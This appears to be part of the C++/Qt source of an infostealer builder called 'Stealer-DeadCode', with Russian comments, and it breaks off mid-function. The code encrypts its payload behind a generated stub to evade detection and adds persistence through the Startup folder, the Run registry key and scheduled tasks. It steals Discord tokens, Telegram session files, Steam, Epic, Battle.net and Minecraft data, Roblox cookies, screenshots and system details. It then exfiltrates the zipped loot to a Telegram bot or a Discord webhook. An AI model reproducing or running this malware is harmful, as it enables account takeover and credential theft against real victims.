    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка: Не удалось скомпилировать stub");
        std::filesystem::remove("stub.cpp");
        return "";
    }

    std::ifstream stubExeFile(stubExePath, std::ios::binary);
    if (!stubExeFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть скомпилированный stub");
        std::filesystem::remove("stub.cpp");
        std::filesystem::remove(stubExePath);
        return "";
    }
    std::vector<char> stubData((std::istreambuf_iterator<char>(stubExeFile)), std::istreambuf_iterator<char>());
    stubExeFile.close();

    std::filesystem::remove("stub.cpp");
    std::filesystem::remove(stubExePath);

    emitLog("Код загрузчика (stub) успешно сгенерирован");
    return std::string(stubData.begin(), stubData.end());
}

// Реализация encryptBuild
bool MainWindow::encryptBuild(const std::string& buildPath, const std::string& key) {
    emitLog("Шифрование билда: " + QString::fromStdString(buildPath));

    std::ifstream inFile(buildPath, std::ios::binary);
    if (!inFile) {
        emitLog("Ошибка: Не удалось открыть билд для чтения");
        return false;
    }

    std::vector<char> buildData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::vector<char> encryptedData = buildData;
    for (size_t i = 0; i < encryptedData.size(); ++i) {
        encryptedData[i] ^= key[i % key.length()];
    }

    std::string stubCode = generateStubCode(key);
    if (stubCode.empty()) {
        emitLog("Ошибка: Не удалось сгенерировать stub для шифрования");
        return false;
    }

    std::string encryptedBuildPath = buildPath + ".encrypted.exe";
    std::ofstream outFile(encryptedBuildPath, std::ios::binary);
    if (!outFile) {
        emitLog("Ошибка: Не удалось создать зашифрованный билд");
        return false;
    }

    outFile.write(stubCode.c_str(), stubCode.size());
    outFile.write(encryptedData.data(), encryptedData.size());
    outFile.close();

    try {
        std::filesystem::remove(buildPath);
        std::filesystem::rename(encryptedBuildPath, buildPath);
        emitLog("Билд успешно зашифрован");
        return true;
    } catch (const std::exception& e) {
        emitLog("Ошибка при шифровании билда: " + QString::fromStdString(e.what()));
        return false;
    }
}

// Реализация compileBuild
bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::string& junkCode) {
    emitLog("Компиляция билда...");

    std::filesystem::create_directories("builds");

    std::string sourceCode = "#include \"build_key.h\"\n";
    sourceCode += "#include \"mainwindow.h\"\n";
    sourceCode += polymorphicCode + "\n";
    sourceCode += junkCode + "\n";
    sourceCode += R"(
        int main() {
            runPolymorphicCode();
            runJunkCode();
            MainWindow window;
            window.StealAndSendData("temp");
            return 0;
        }
    )";

    std::string sourcePath = "builds/temp_source.cpp";
    std::ofstream sourceFile(sourcePath);
    if (!sourceFile) {
        emitLog("Ошибка: Не удалось создать исходный файл для компиляции");
        return false;
    }
    sourceFile << sourceCode;
    sourceFile.close();

    std::string buildPath = "builds/" + (config.filename.empty() ? "DeadCode.exe" : config.filename);
    std::string compileCommand = "g++ \"" + sourcePath + "\" -o \"" + buildPath + "\" -mwindows -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
    if (!config.iconPath.empty()) {
        compileCommand += " -I. -L. -I./include -L./lib \"" + config.iconPath + "\"";
    } else {
        compileCommand += " -I. -L. -I./include -L./lib";
    }

    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка компиляции билда");
        std::filesystem::remove(sourcePath);
        return false;
    }

    std::filesystem::remove(sourcePath);
    emitLog("Билд успешно скомпилирован: " + QString::fromStdString(buildPath));
    return true;
}

// Реализация archiveData
std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
    emitLog("Создание ZIP-архива в директории: " + QString::fromStdString(dir));

    if (files.empty()) {
        emitLog("Ошибка: Список файлов для архивации пуст");
        return "";
    }

    std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
    zip_error_t err;
    zip_error_init(&err); // Инициализация структуры ошибки

    // Открываем архив без третьего аргумента, ошибки будем получать через zip_get_error
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку, если zip == nullptr
        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(zipErr)));
        zip_error_fini(&err);
        return "";
    }

    bool hasFiles = false;
    for (const auto& filePath : files) {
        if (!std::filesystem::exists(filePath)) {
            emitLog("Файл не найден для архивации: " + QString::fromStdString(filePath));
            continue;
        }

        zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
        if (!source) {
            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " +
                    QString(zip_error_strerror(zip_get_error(zip))));
            continue;
        }

        std::string fileName = std::filesystem::path(filePath).filename().string();
        if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " +
                    QString(zip_error_strerror(zip_get_error(zip))));
            zip_source_free(source);
            continue;
        }
        hasFiles = true;
    }

    if (!hasFiles) {
        emitLog("Ошибка: Нет файлов для добавления в ZIP-архив");
        zip_discard(zip);
        zip_error_fini(&err);
        return "";
    }

    // Закрываем архив и проверяем ошибки
    if (zip_close(zip) < 0) {
        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку до освобождения
        emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(zipErr)));
        zip_discard(zip); // Используем discard, так как zip_close не удался
        zip_error_fini(&err);
        return "";
    }

    zip_error_fini(&err); // Очистка структуры ошибки
    emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
    return zipPath;
}

// Реализация sendToTelegram
void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Telegram...");

    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        emitLog("Ошибка: Токен Telegram или Chat ID не указаны");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
        return;
    }

    // Отправка текстовых данных (data)
    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendMessage";
    std::string postFields = "chat_id=" + config.telegramChatId + "&text=" + curl_easy_escape(curl, data.c_str(), data.length());
    std::string response;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки текста через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
        if (doc.isNull() || !doc.object().value("ok").toBool()) {
            emitLog("Ошибка Telegram API при отправке текста: " + QString::fromStdString(response));
        } else {
            emitLog("Текст успешно отправлен через Telegram");
        }
    }

    // Создание и отправка ZIP-архива с файлами
    if (!files.empty()) {
        std::string tempDir = "temp_" + generateRandomString(8);
        std::filesystem::create_directories(tempDir);

        std::string createdZipPath = archiveData(tempDir, files);
        if (createdZipPath.empty()) {
            emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Telegram");
            curl_easy_cleanup(curl);
            std::filesystem::remove_all(tempDir);
            return;
        }

        std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
        const std::uintmax_t telegramFileSizeLimit = 50 * 1024 * 1024; // 50 МБ
        if (fileSize > telegramFileSizeLimit) {
            emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Telegram (50 МБ)");
            curl_easy_cleanup(curl);
            std::filesystem::remove_all(tempDir);
            return;
        }

        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, config.telegramChatId.c_str(), CURL_ZERO_TERMINATED);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "document");
        curl_mime_filedata(part, createdZipPath.c_str());

        url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            emitLog("Ошибка отправки архива через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
            if (doc.isNull() || !doc.object().value("ok").toBool()) {
                emitLog("Ошибка Telegram API при отправке архива: " + QString::fromStdString(response));
            } else {
                emitLog("ZIP-архив успешно отправлен через Telegram");
            }
        }

        curl_mime_free(mime);
        std::filesystem::remove_all(tempDir);
    }

    curl_easy_cleanup(curl);
    emitLog("Отправка в Telegram завершена");
}

// Реализация sendToDiscord
void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Discord...");

    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Webhook URL для Discord не указан");
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Discord");
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;

    // Отправка текстовых данных (data)
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "content");
    curl_mime_data(part, data.c_str(), data.length());

    // Создание и добавление ZIP-архива с файлами
    std::string tempDir = "temp_" + generateRandomString(8);
    std::filesystem::create_directories(tempDir);
    std::string createdZipPath;

    if (!files.empty()) {
        createdZipPath = archiveData(tempDir, files);
        if (createdZipPath.empty()) {
            emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Discord");
            curl_mime_free(mime);
            curl_easy_cleanup(curl);
            std::filesystem::remove_all(tempDir);
            return;
        }

        std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
        const std::uintmax_t discordFileSizeLimit = 25 * 1024 * 1024; // 25 МБ
        if (fileSize > discordFileSizeLimit) {
            emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Discord (25 МБ)");
            curl_mime_free(mime);
            curl_easy_cleanup(curl);
            std::filesystem::remove_all(tempDir);
            return;
        }

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "file");
        curl_mime_filedata(part, createdZipPath.c_str());
    }

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки через Discord: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        if (response.find("id") == std::string::npos) {
            emitLog("Ошибка Discord Webhook: " + QString::fromStdString(response));
        } else {
            emitLog("Данные и ZIP-архив успешно отправлены через Discord");
        }
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    if (!tempDir.empty()) {
        try {
            std::filesystem::remove_all(tempDir);
            emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
        }
    }
}

// Реализация sendData
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    emitLog("Подготовка данных для отправки...");
    std::string data = encryptedData.toStdString();
    if (config.sendMethod == "Telegram") {
        sendToTelegram(data, files);
    } else if (config.sendMethod == "Discord") {
        sendToDiscord(data, files);
    } else {
        saveToLocalFile(data, "output"); // Фиксированная директория
    }
}

// Настройка персистентности и автозагрузки
void MainWindow::setupPersistence() {
    if (!config.autoStart && !config.persist) {
        emitLog("Персистентность и автозагрузка отключены, пропускаем...");
        return;
    }

    emitLog("Настройка персистентности и автозагрузки...");

    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу. Код ошибки: " + 
                QString::number(GetLastError()));
        return;
    }
    std::string currentExePath = exePath;

    // Через Startup и реестр
    if (config.persist || config.autoStart) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить путь к APPDATA. Код ошибки: " + 
                    QString::number(errno));
            free(appDataPath);
            return;
        }
        std::string appData(appDataPath);
        free(appDataPath);

        std::string filename = config.filename.empty() ? "DeadCode.exe" : config.filename;
        std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        std::string persistPath = persistDir + "\\" + filename;

        if (config.persist) {
            try {
                std::filesystem::create_directories(persistDir);
                if (std::filesystem::copy_file(currentExePath, persistPath, 
                                               std::filesystem::copy_options::overwrite_existing)) {
                    emitLog("Файл скопирован для персистентности: " + 
                            QString::fromStdString(persistPath));
                } else {
                    emitLog("Ошибка: Не удалось скопировать файл для персистентности");
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка при копировании для персистентности: " + 
                        QString::fromStdString(e.what()));
            }
        }

        if (config.autoStart) {
            HKEY hKey;
            LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
                                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                       0, KEY_SET_VALUE, &hKey);
            if (result == ERROR_SUCCESS) {
                std::string appName = "DeadCode";
                if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, 
                                  reinterpret_cast<const BYTE*>(persistPath.c_str()), 
                                  static_cast<DWORD>(persistPath.length() + 1)) == ERROR_SUCCESS) {
                    emitLog("Программа добавлена в автозагрузку через реестр: " + 
                            QString::fromStdString(appName));
                } else {
                    emitLog("Ошибка добавления в реестр: " + QString::number(GetLastError()));
                }
                RegCloseKey(hKey);
            } else {
                emitLog("Ошибка открытия ключа реестра: " + QString::number(result));
            }
        }
    }

    // Через планировщик задач
    if (config.persist) {
        std::string taskName = "DeadCodePersistence_" + generateRandomString(4);
        std::string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + currentExePath + "\" /sc onlogon /rl highest /f";
        if (system(command.c_str()) == 0) {
            emitLog("Задача успешно создана в планировщике задач: " + QString::fromStdString(taskName));
        } else {
            emitLog("Ошибка создания задачи в планировщике задач");
        }
    }

    emitLog("Настройка персистентности и автозагрузки завершена");
}

// Реализация collectSystemInfo
std::string MainWindow::collectSystemInfo(const std::string& dir) {
    emitLog("Сбор системной информации...");

    std::string sysDir = dir + "\\SystemInfo";
    std::filesystem::create_directories(sysDir);

    std::string sysInfoPath = sysDir + "\\system_info.txt";
    std::ofstream outFile(sysInfoPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для системной информации");
        return "";
    }

    outFile << "Hostname: " << QHostInfo::localHostName().toStdString() << "\n";
    outFile << "OS: " << QSysInfo::prettyProductName().toStdString() << "\n";
    outFile << "OS Version: " << QSysInfo::productVersion().toStdString() << "\n";
    outFile << "Architecture: " << QSysInfo::currentCpuArchitecture().toStdString() << "\n";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char cpuName[1024];
        DWORD size = sizeof(cpuName);
        if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, reinterpret_cast<LPBYTE>(cpuName), &size) == ERROR_SUCCESS) {
            outFile << "CPU: " << cpuName << "\n";
        }
        RegCloseKey(hKey);
    }

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        outFile << "Total Physical Memory: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
        outFile << "Available Physical Memory: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            outFile << "Network Adapter: " << adapter->Description << "\n";
            outFile << "MAC Address: ";
            for (int i = 0; i < static_cast<int>(adapter->AddressLength); ++i) {
                outFile << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(adapter->Address[i]);
                if (i < static_cast<int>(adapter->AddressLength) - 1) outFile << "-";
            }
            outFile << "\nIP Address: " << adapter->IpAddressList.IpAddress.String << "\n\n";
        }
    }

    outFile.close();
    emitLog("Системная информация сохранена: " + QString::fromStdString(sysInfoPath));
    collectedFiles.push_back(sysInfoPath);
    return sysInfoPath;
}

// Реализация TakeScreenshot
std::string MainWindow::TakeScreenshot(const std::string& dir) {
    emitLog("Создание скриншота...");

    std::string screenshotDir = dir + "\\Screenshots";
    std::filesystem::create_directories(screenshotDir);

    QScreen* screen = QGuiApplication::primaryScreen();
    if (!screen) {
        emitLog("Ошибка: Не удалось получить доступ к экрану");
        return "";
    }

    QPixmap originalPixmap = screen->grabWindow(0);
    if (originalPixmap.isNull()) {
        emitLog("Ошибка: Не удалось сделать скриншот");
        return "";
    }

    QPainter painter(&originalPixmap);
    QFont font("Arial", 30, QFont::Bold);
    painter.setFont(font);
    painter.setPen(Qt::red);
    QString text = "Stealer-DeadCode";
    QFontMetrics fontMetrics(font);
    QRect textRect = fontMetrics.boundingRect(text);
    int x = (originalPixmap.width() - textRect.width()) / 2;
    int y = (originalPixmap.height() - textRect.height()) / 2;
    painter.drawText(x, y, text);

    std::string screenshotPath = screenshotDir + "\\screenshot_" + generateRandomString(8) + ".png";
    if (!originalPixmap.save(QString::fromStdString(screenshotPath), "PNG")) {
        emitLog("Ошибка: Не удалось сохранить скриншот");
        return "";
    }

    emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath));
    collectedFiles.push_back(screenshotPath);
    return screenshotPath;
}

// Класс для многопоточного извлечения токенов Discord
class DiscordTokenStealer : public QRunnable {
public:
    DiscordTokenStealer(MainWindow* mw, const std::string& dir, const std::string& path)
        : mw(mw), dir(dir), path(path) {}
    void run() override {
        std::string tokensPath = dir + "\\discord_tokens.txt";
        std::ofstream outFile(tokensPath, std::ios::app);
        if (!outFile.is_open()) {
            mw->emitLog("Ошибка: Не удалось открыть файл для токенов Discord в потоке");
            return;
        }

        std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
        std::string tokenData;

        if (std::filesystem::exists(path)) {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) continue;
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        std::string token = match[0].str();
                        tokenData += "Token: " + token + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }

        if (!tokenData.empty()) {
            outFile << tokenData;
        }
        outFile.close();
        if (!tokenData.empty()) {
            mw->collectedFiles.push_back(tokensPath);
            mw->emitLog("Токены Discord собраны из " + QString::fromStdString(path));
        }
    }
private:
    MainWindow* mw;
    std::string dir;
    std::string path;
};

// Реализация StealDiscordTokens с многопоточностью
std::string MainWindow::StealDiscordTokens(const std::string& dir) {
    emitLog("Начало кражи токенов Discord...");

    std::string discordDir = dir + "\\DiscordData";
    std::filesystem::create_directories(discordDir);

    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA");
        return "";
    }
    std::string appData(appDataPath);

    std::vector<std::string> discordPaths = {
        appData + decryptString(encryptedDiscordPath, 0),
        appData + "\\DiscordCanary\\Local Storage\\leveldb\\",
        appData + "\\DiscordPTB\\Local Storage\\leveldb\\"
    };

    QThreadPool pool;
    pool.setMaxThreadCount(QThread::idealThreadCount());

    for (const auto& path : discordPaths) {
        pool.start(new DiscordTokenStealer(this, discordDir, path));
    }

    pool.waitForDone();

    std::string tokensPath = discordDir + "\\discord_tokens.txt";
    if (std::filesystem::exists(tokensPath) && std::filesystem::file_size(tokensPath) > 0) {
        std::ifstream inFile(tokensPath);
        std::string tokenData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
        return tokenData;
    } else {
        std::filesystem::remove(tokensPath);
        emitLog("Токены Discord не найдены");
        return "";
    }
}

// Реализация StealTelegramData
std::string MainWindow::StealTelegramData(const std::string& dir) {
    emitLog("Начало кражи данных Telegram...");

    std::string telegramDir = dir + "\\TelegramData";
    std::filesystem::create_directories(telegramDir);

    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA");
        return "";
    }
    std::string appData(appDataPath);

    std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
    if (!std::filesystem::exists(telegramPath)) {
        emitLog("Директория Telegram не найдена");
        return "";
    }

    std::string result;
    for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
        std::string filename = entry.path().filename().string();
        if (filename.find("key_data") != std::string::npos || filename.find("D877F783D5D3EF8C") != std::string::npos) {
            std::string destFilePath = telegramDir + "\\" + filename;
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            collectedFiles.push_back(destFilePath);
            result += "Telegram File: " + destFilePath + "\n";
        }
    }
    emitLog("Данные Telegram скопированы в: " + QString::fromStdString(telegramDir));
    return result;
}

// Реализация StealSteamData
std::string MainWindow::StealSteamData(const std::string& dir) {
    emitLog("Начало кражи данных Steam...");

    std::string steamDir = dir + "\\SteamData";
    std::filesystem::create_directories(steamDir);

    std::string steamPath;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
            steamPath = std::string(buffer);
        }
        RegCloseKey(hKey);
    }

    if (steamPath.empty()) {
        emitLog("Ошибка: Не удалось определить путь к Steam");
        return "";
    }

    std::string result;
    std::string configPath = steamPath + "\\config";
    std::string ssfnPath;
    for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
        if (entry.path().filename().string().find("ssfn") != std::string::npos) {
            ssfnPath = entry.path().string();
            break;
        }
    }

    if (std::filesystem::exists(configPath + "\\config.vdf")) {
        std::string destConfigPath = steamDir + "\\config.vdf";
        std::filesystem::copy_file(configPath + "\\config.vdf", destConfigPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл config.vdf Steam скопирован: " + QString::fromStdString(destConfigPath));
        collectedFiles.push_back(destConfigPath);
        result += "Config: " + destConfigPath + "\n";
    }

    if (!ssfnPath.empty() && std::filesystem::exists(ssfnPath)) {
        std::string destSsfnPath = steamDir + "\\" + std::filesystem::path(ssfnPath).filename().string();
        std::filesystem::copy_file(ssfnPath, destSsfnPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл SSFN Steam скопирован: " + QString::fromStdString(destSsfnPath));
        collectedFiles.push_back(destSsfnPath);
        result += "SSFN: " + destSsfnPath + "\n";
    }

    if (config.steamMAFile) {
        std::string maFilesPath = steamPath + "\\steamapps\\common\\Steam Mobile\\maFiles";
        if (std::filesystem::exists(maFilesPath)) {
            std::string destMaFilesDir = steamDir + "\\maFiles";
            std::filesystem::create_directories(destMaFilesDir);
            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
                if (entry.path().extension() == ".maFile") {
                    std::string destFilePath = destMaFilesDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destFilePath);
                    result += "MAFile: " + destFilePath + "\n";
                }
            }
            emitLog("MAFiles Steam скопированы в: " + QString::fromStdString(destMaFilesDir));
        }
    }

    emitLog("Кража данных Steam завершена");
    return result;
}

// Реализация StealEpicGamesData
std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    emitLog("Начало кражи данных Epic Games...");

    std::string epicDir = dir + "\\EpicGamesData";
    std::filesystem::create_directories(epicDir);

    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
    if (!localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
        return "";
    }
    std::string localAppData(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config";
    if (!std::filesystem::exists(epicPath)) {
        emitLog("Директория Epic Games не найдена");
        return "";
    }

    std::string result;
    std::string destEpicDir = epicDir + "\\Config";
    std::filesystem::create_directories(destEpicDir);
    for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath)) {
        if (entry.path().extension() == ".ini") {
            std::string relativePath = std::filesystem::relative(entry.path(), epicPath).string();
            std::string destFilePath = destEpicDir + "\\" + relativePath;
            std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            collectedFiles.push_back(destFilePath);
            result += "Config File: " + destFilePath + "\n";
        }
    }
    emitLog("Конфигурационные файлы Epic Games скопированы в: " + QString::fromStdString(destEpicDir));
    return result;
}

// Реализация StealRobloxData
std::string MainWindow::StealRobloxData(const std::string& dir) {
    emitLog("Начало кражи данных Roblox...");

    std::string robloxDir = dir + "\\RobloxData";
    std::filesystem::create_directories(robloxDir);

    std::string browserData = stealBrowserData(dir);
    std::string cookiesPath = robloxDir + "\\roblox_cookies.txt";
    std::ofstream outFile(cookiesPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для куки Roblox");
        return "";
    }

    std::string cookies;
    std::regex robloxCookieRegex("(.ROBLOSECURITY=.*?);");
    std::smatch match;
    std::string::const_iterator searchStart(browserData.cbegin());
    while (std::regex_search(searchStart, browserData.cend(), match, robloxCookieRegex)) {
        cookies += "Cookie: " + match[1].str() + "\n";
        searchStart = match.suffix().first;
    }

    if (!cookies.empty()) {
        outFile << cookies;
        outFile.close();
        collectedFiles.push_back(cookiesPath);
        emitLog("Куки Roblox сохранены: " + QString::fromStdString(cookiesPath));
        return cookies;
    } else {
        outFile.close();
        std::filesystem::remove(cookiesPath);
        emitLog("Куки Roblox не найдены");
        return "";
    }
}

// Реализация StealBattleNetData
std::string MainWindow::StealBattleNetData(const std::string& dir) {
    emitLog("Начало кражи данных Battle.net...");

    std::string battleNetDir = dir + "\\BattleNetData";
    std::filesystem::create_directories(battleNetDir);

    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
    if (!localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
        return "";
    }
    std::string localAppData(localAppDataPath);

    std::string battleNetPath = localAppData + "\\Battle.net";
    if (!std::filesystem::exists(battleNetPath)) {
        emitLog("Директория Battle.net не найдена");
        return "";
    }

    std::string result;
    std::string destBattleNetDir = battleNetDir + "\\Config";
    std::filesystem::create_directories(destBattleNetDir);
    for (const auto& entry : std::filesystem::recursive_directory_iterator(battleNetPath)) {
        if (entry.path().extension() == ".config" || entry.path().filename() == "Battle.net.config") {
            std::string relativePath = std::filesystem::relative(entry.path(), battleNetPath).string();
            std::string destFilePath = destBattleNetDir + "\\" + relativePath;
            std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            collectedFiles.push_back(destFilePath);
            result += "Config File: " + destFilePath + "\n";
        }
    }
    emitLog("Конфигурационные файлы Battle.net скопированы в: " + QString::fromStdString(destBattleNetDir));
    return result;
}

// Реализация StealMinecraftData
std::string MainWindow::StealMinecraftData(const std::string& dir) {
    emitLog("Начало кражи данных Minecraft...");

    std::string minecraftDir = dir + "\\MinecraftData";
    std::filesystem::create_directories(minecraftDir);

    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA");
        return "";
    }
    std::string appData(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft";
    if (!std::filesystem::exists(minecraftPath)) {
        emitLog("Директория Minecraft не найдена");
        return "";
    }

    std::string result;
    std::string profilesPath = minecraftPath + "\\launcher_profiles.json";
    if (std::filesystem::exists(profilesPath)) {
        std::string destProfilesPath = minecraftDir + "\\launcher_profiles.json";
        std::filesystem::copy_file(profilesPath, destProfilesPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл launcher_profiles.json Minecraft скопирован: " + QString::fromStdString(destProfilesPath));
        collectedFiles.push_back(destProfilesPath);
        result += "Profiles: " + destProfilesPath + "\n";
    }

    std::string modsPath = minecraftPath + "\\mods";
    if (std::filesystem::exists(modsPath)) {
        std::string destModsDir = minecraftDir + "\\mods";
        std::filesystem::create_directories(destModsDir);
